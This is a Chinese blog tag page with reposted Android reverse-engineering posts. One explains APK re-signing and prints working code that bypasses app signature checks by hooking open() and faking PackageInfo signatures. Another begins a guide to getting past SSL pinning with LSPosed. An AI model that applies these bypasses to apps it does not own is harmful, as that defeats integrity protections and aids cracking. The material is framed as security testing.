<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Tag: Bypass | 氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="氕氘氚">
<meta property="og:url" content="http://example.com/tags/Bypass/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        
  <section class="page-header tag">
    <h1>- <span>Bypass</span> -</h1>
  </section>






<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/25/Android-Signature/">
                Android逆向-获取APP签名
            </a>
        </h2>
    
    <time>
        Jan 25, 2024
    </time>
    <section class="content">
        <h1><span id="android逆向-获取app签名">Android逆向-获取APP签名</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://taardisaa.github.io/2023/09/08/Android%E9%80%86%E5%90%91-APP%E7%AD%BE%E5%90%8D/">Taardisaa</a> 并作补充</p>
<p>很久以前开的blog，关于如何获取APP签名。不知道为啥要写这个了。</p>
</blockquote>
<h1><span id="android逆向-app签名">Android逆向-APP签名</span></h1><h2><span id="生成jks签名">生成JKS签名</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b28a5be05029">Android studio 如何生成jks签名文件 - 简书 (jianshu.com)</a></p>
<p>打开AndroidStudio</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Build--&gt;Generate Signed APK--&gt;APK</span><br></pre></td></tr></table></figure>

<p>然后<code>Key store path</code>选择<code>Create New</code></p>
<p>然后设置好存储路径，密码也设置一下（偷懒写个123456）</p>
<p><code>Key</code>的别名就叫<code>key</code>，密码一样简单。</p>
<p>然后剩下的<code>Certificate</code>全填<code>taardis</code>，<code>Country Code</code>填11451。</p>
<p>反正创建成功后，就在选定路径下出现了<code>jks</code>密钥文件。</p>
</blockquote>
<h2><span id="apk签名">APK签名</span></h2><blockquote>
<p>将APK魔改，重新打包后，需要重新签名。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q610098308/article/details/105138228">Android之通过 apksigner 对 apk 进行 手动签名_恋恋西风的博客-CSDN博客</a></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apksigner.bat sign --verbose --ks D:\Android\Keystore\taardis.jks --v1-signing-enabled false --v2-signing-enabled true --ks-key-alias key --ks-pass pass:<span class="number">123456</span> --key-pass pass:<span class="number">123456</span> --out D:\Android\Frida\gadget\bs.apk D:\Android\Frida\gadget\b.apk</span><br></pre></td></tr></table></figure>

<p>成功后提示：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Signed</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="获取apk签名">获取APK签名</span></h2><blockquote>
<p>首先APK解包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d &lt;apk&gt;</span><br></pre></td></tr></table></figure>

<p>然后在 <code>META-INF</code> 文件夹拿到 <code>CERT.RSA</code> 文件。之后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -printcert -file CERT.RSA</span><br></pre></td></tr></table></figure>

<p>不过Keytool似乎是Java的工具，不管了现在用不上。</p>
</blockquote>
<h2><span id="jebx2fjadx">JEB&#x2F;JADX</span></h2><blockquote>
<p>这种反编译器也能直接看到APK的签名信息。</p>
</blockquote>
<h2><span id="mt-app签名检查及绕过">MT APP签名检查及绕过</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/L-JINBIN/ApkSignatureKillerEx">L-JINBIN&#x2F;ApkSignatureKillerEx: 新版MT去签及对抗 (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/429352">从“去除签名验证”说起 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1733548-1-1.html">过签名校验(2) – MT 的 IO 重定向实践 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p>MT提供的签名绕过方式能够实现对API和APK方式的绕过。但是对于SVC的则无能为力。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">signatureExpected</span> <span class="operator">=</span> <span class="string">&quot;3bf8931788824c6a1f2c6f6ff80f6b21&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">signatureFromAPI</span> <span class="operator">=</span> md5(signatureFromAPI());</span><br><span class="line"><span class="type">String</span> <span class="variable">signatureFromAPK</span> <span class="operator">=</span> md5(signatureFromAPK());</span><br><span class="line"><span class="type">String</span> <span class="variable">signatureFromSVC</span> <span class="operator">=</span> md5(signatureFromSVC());</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="api检测">API检测</span></h3><blockquote>
<p>用<code>PackageManager</code>直接获得签名。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] signatureFromAPI() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="meta">@SuppressLint(&quot;PackageManagerGetSignatures&quot;)</span></span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">info</span> <span class="operator">=</span> getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);</span><br><span class="line">        <span class="keyword">return</span> info.signatures[<span class="number">0</span>].toByteArray();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="apk检测">APK检测</span></h3><blockquote>
<p>找到APP私有文件夹下的<code>base.apk</code>，然后得到签名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] signatureFromAPK() &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(getPackageResourcePath())) &#123;</span><br><span class="line">        Enumeration&lt;? <span class="keyword">extends</span> <span class="title class_">ZipEntry</span>&gt; entries = zipFile.entries();</span><br><span class="line">        <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">ZipEntry</span> <span class="variable">entry</span> <span class="operator">=</span> entries.nextElement();</span><br><span class="line">            <span class="keyword">if</span> (entry.getName().matches(<span class="string">&quot;(META-INF/.*)\\.(RSA|DSA|EC)&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> zipFile.getInputStream(entry);</span><br><span class="line">                <span class="type">CertificateFactory</span> <span class="variable">certFactory</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X509&quot;</span>);</span><br><span class="line">                <span class="type">X509Certificate</span> <span class="variable">x509Cert</span> <span class="operator">=</span> (X509Certificate) certFactory.generateCertificate(is);</span><br><span class="line">                <span class="keyword">return</span> x509Cert.getEncoded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="svc检测">SVC检测</span></h3><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] signatureFromSVC() &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ParcelFileDescriptor</span> <span class="variable">fd</span> <span class="operator">=</span> ParcelFileDescriptor.adoptFd(openAt(getPackageResourcePath()));</span><br><span class="line">         <span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fd.getFileDescriptor()))) &#123;</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry.getName().matches(<span class="string">&quot;(META-INF/.*)\\.(RSA|DSA|EC)&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">CertificateFactory</span> <span class="variable">certFactory</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X509&quot;</span>);</span><br><span class="line">                <span class="type">X509Certificate</span> <span class="variable">x509Cert</span> <span class="operator">=</span> (X509Certificate) certFactory.generateCertificate(zis);</span><br><span class="line">                <span class="keyword">return</span> x509Cert.getEncoded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="绕过">绕过</span></h3><blockquote>
<p>Java层的东西不多</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">killOpen</span><span class="params">(String packageName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Native层Hook</span></span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SignatureKiller&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Load SignatureKiller library failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取/proc/self/maps读取APP路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">apkPath</span> <span class="operator">=</span> getApkPath(packageName);</span><br><span class="line">    <span class="keyword">if</span> (apkPath == <span class="literal">null</span>) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Get apk path failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取自身APK文件（私有目录下的base.apk）</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">apkFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(apkPath);</span><br><span class="line">    <span class="comment">// 在APP私有目录下创建origin.apk文件</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">repFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getDataFile(packageName), <span class="string">&quot;origin.apk&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(apkFile)) &#123;</span><br><span class="line">        <span class="comment">// 将APK中的origin.apk给提取出来（origin.apk是MT去签是生成的，是初始没有被去签的APK）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;assets/SignatureKiller/origin.apk&quot;</span>;</span><br><span class="line">        <span class="type">ZipEntry</span> <span class="variable">entry</span> <span class="operator">=</span> zipFile.getEntry(name);</span><br><span class="line">        <span class="keyword">if</span> (entry == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Entry not found: &quot;</span> + name);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 读取出来</span></span><br><span class="line">        <span class="keyword">if</span> (!repFile.exists() || repFile.length() != entry.getSize()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> zipFile.getInputStream(entry); <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(repFile)) &#123;</span><br><span class="line">                <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">102400</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = is.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 传入底层so Hook</span></span><br><span class="line">    hookApkPath(apkFile.getAbsolutePath(), repFile.getAbsolutePath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看Native层，实际上是XHook，用于替换libc函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_jni.c</span><br></pre></td></tr></table></figure>

<p>实际上就做了个字符串替换，有意将原本要打开的APK替换成<code>origin.apk</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *apkPath__;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *repPath__;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*old_open)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span>, <span class="type">mode_t</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">openImpl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span> &#123;</span><br><span class="line">    <span class="comment">//XH_LOG_ERROR(&quot;open: %s&quot;, pathname);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(pathname, apkPath__) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//XH_LOG_ERROR(&quot;replace -&gt; %s&quot;, repPath__);</span></span><br><span class="line">        <span class="keyword">return</span> old_open(repPath__, flags, mode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> old_open(pathname, flags, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT <span class="type">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_bin_mt_signature_KillerApplication_hookApkPath</span><span class="params">(JNIEnv *env, __attribute__((unused)) jclass clazz, jstring apkPath, jstring repPath)</span> &#123;</span><br><span class="line">    apkPath__ = (*env)-&gt;GetStringUTFChars(env, apkPath, <span class="number">0</span>);</span><br><span class="line">    repPath__ = (*env)-&gt;GetStringUTFChars(env, repPath, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;openat64&quot;</span>, openat64Impl, (<span class="type">void</span> **) &amp;old_openat64);</span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;openat&quot;</span>, openatImpl, (<span class="type">void</span> **) &amp;old_openat);</span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;open64&quot;</span>, open64Impl, (<span class="type">void</span> **) &amp;old_open64);</span><br><span class="line">    xhook_register(<span class="string">&quot;.*\\.so$&quot;</span>, <span class="string">&quot;open&quot;</span>, openImpl, (<span class="type">void</span> **) &amp;old_open);</span><br><span class="line"></span><br><span class="line">    xhook_refresh(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Hook open函数，可以把基于APK读取的签名方式给绕过。</p>
<p>下面提供一个绕过基于PackageManager的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">killPM</span><span class="params">(String packageName, String signatureData)</span> &#123;</span><br><span class="line">    <span class="comment">// 构造一个假的签名</span></span><br><span class="line">    <span class="type">Signature</span> <span class="variable">fakeSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Signature</span>(Base64.decode(signatureData, Base64.DEFAULT));</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; originalCreator = PackageInfo.CREATOR;</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; creator = <span class="keyword">new</span> <span class="title class_">Parcelable</span>.Creator&lt;PackageInfo&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PackageInfo <span class="title function_">createFromParcel</span><span class="params">(Parcel source)</span> &#123;</span><br><span class="line">            <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> originalCreator.createFromParcel(source);</span><br><span class="line">            <span class="keyword">if</span> (packageInfo.packageName.equals(packageName)) &#123; <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span> (packageInfo.signatures != <span class="literal">null</span> &amp;&amp; packageInfo.signatures.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    packageInfo.signatures[<span class="number">0</span>] = fakeSignature; <span class="comment">// 将虚假的签名放入packageInfo，取代原来的</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (packageInfo.signingInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">                        Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                        <span class="keyword">if</span> (signaturesArray != <span class="literal">null</span> &amp;&amp; signaturesArray.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            signaturesArray[<span class="number">0</span>] = fakeSignature;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> packageInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PackageInfo[] newArray(<span class="type">int</span> size) &#123;</span><br><span class="line">            <span class="keyword">return</span> originalCreator.newArray(size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 用假的creator替换原来的PackageInfo.CREATOR</span></span><br><span class="line">        findField(PackageInfo.class, <span class="string">&quot;CREATOR&quot;</span>).set(<span class="literal">null</span>, creator);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">        <span class="comment">// 解除某些Android系统API的使用限制？</span></span><br><span class="line">        HiddenApiBypass.addHiddenApiExemptions(<span class="string">&quot;Landroid/os/Parcel;&quot;</span>, <span class="string">&quot;Landroid/content/pm&quot;</span>, <span class="string">&quot;Landroid/app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清空签名缓存</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">cache</span> <span class="operator">=</span> findField(PackageManager.class, <span class="string">&quot;sPackageInfoCache&quot;</span>).get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// noinspection ConstantConditions</span></span><br><span class="line">        cache.getClass().getMethod(<span class="string">&quot;clear&quot;</span>).invoke(cache);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清空签名缓存</span></span><br><span class="line">        Map&lt;?, ?&gt; mCreators = (Map&lt;?, ?&gt;) findField(Parcel.class, <span class="string">&quot;mCreators&quot;</span>).get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// noinspection ConstantConditions</span></span><br><span class="line">        mCreators.clear();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清空签名缓存</span></span><br><span class="line">        Map&lt;?, ?&gt; sPairedCreators = (Map&lt;?, ?&gt;) findField(Parcel.class, <span class="string">&quot;sPairedCreators&quot;</span>).get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// noinspection ConstantConditions</span></span><br><span class="line">        sPairedCreators.clear();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="参考">参考</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuyongyin/archive/2023/01/15/17005314.html">Java Keytool 介绍 - 且行且码 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d00e9754df43">获取Android应用签名的几种方式 - 简书 (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b28a5be05029">Android studio 如何生成jks签名文件 - 简书 (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36270253/article/details/114007681">apktool重新打包时报错_apktool 忽略错误信息__y4nnl2的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q610098308/article/details/105138228">Android之通过 apksigner 对 apk 进行 手动签名_恋恋西风的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.android.google.cn/studio/command-line/apksigner?hl=zh-cn">apksigner | Android 开发者 | Android Developers (google.cn)</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Signature/" rel="tag">Signature</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/22/LSPosed-SSL/">
                APP 测试 - LSPosed 绕过 SSL 证书抓包
            </a>
        </h2>
    
    <time>
        Jan 22, 2024
    </time>
    <section class="content">
        <h1><span id="app-测试-lsposed-绕过-ssl-证书抓包">APP 测试 - LSPosed 绕过 SSL 证书抓包</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/279f59b.html">LuckySec</a> 并作补充</p>
</blockquote>
<h2><span id="前言">前言</span></h2><blockquote>
<p>前面介绍了通过<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/98df6d1a.html">《VirtualXposed 绕过 SSL 证书抓包》</a>，这个方法有些局限性，比如不能在电脑上的《夜神模拟器》、《雷电模拟器》运行，需要一部测试手机等因素，对于部分人来说可能不太方便，还是更喜欢都在电脑上完成这系列操作，可以尝试用 LSPosed 绕过 SSL 证书抓包。</p>
</blockquote>
<h2><span id="0x01-工具简介">0x01 工具简介</span></h2><blockquote>
<p>LSPosed 是一个基于 Riru&#x2F;Zygisk 的 ART Hook 框架，该框架利用 LSPlant 挂钩框架提供与 OG Xposed 一致的 API, 支持 Android 8.1 ~ 13。</p>
<p>Xposed 是一个模块框架，可以在不接触任何 APK 的情况下改变系统和应用程序的行为。利用 Xposed 的 TrustMeAlready 模块插件，可以防止软件检测抓包，绕过大部分 ssl-pinning，保证 APP 抓包的可续性能。</p>
</blockquote>
